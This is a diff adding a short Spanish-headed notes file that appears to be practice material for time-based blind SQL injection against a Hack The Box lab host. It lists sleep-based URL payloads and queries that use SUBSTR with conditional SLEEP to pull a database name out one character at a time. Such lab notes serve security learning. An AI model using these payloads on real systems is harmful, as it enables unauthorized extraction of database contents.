@@ -1,0 +1,14 @@
+
+# INYECCIONES
+http://passage.htb/index.php?id=1' or sleep(5)-- -
+http://passage.htb/index.php?id=1' and sleep(5)-- -
+
+SELECT username FROM Alumnos WHERE id='1' AND SLEEP(5);-- -';
+SELECT SUBSTR("hola",1,1);
+SELECT SUBSTR("hola",2,1);
+SELECT SUBSTR("hola",3,1);
+
+SELECT username FROM Alumnos WHERE id='1' AND if(SUBSTR(database(),1,1)='U', sleep(5),1);-- -';
+SELECT username FROM Alumnos WHERE id='1' AND if(SUBSTR(database(),1,1)='u', sleep(5),1);-- -';
+SELECT username FROM Alumnos WHERE id='1' AND if(SUBSTR(database(),2,1)='n', sleep(5),1);-- -';
+SELECT username FROM Alumnos WHERE id='1' AND if(SUBSTR(database(),3,1)='i', sleep(5),1);-- -';
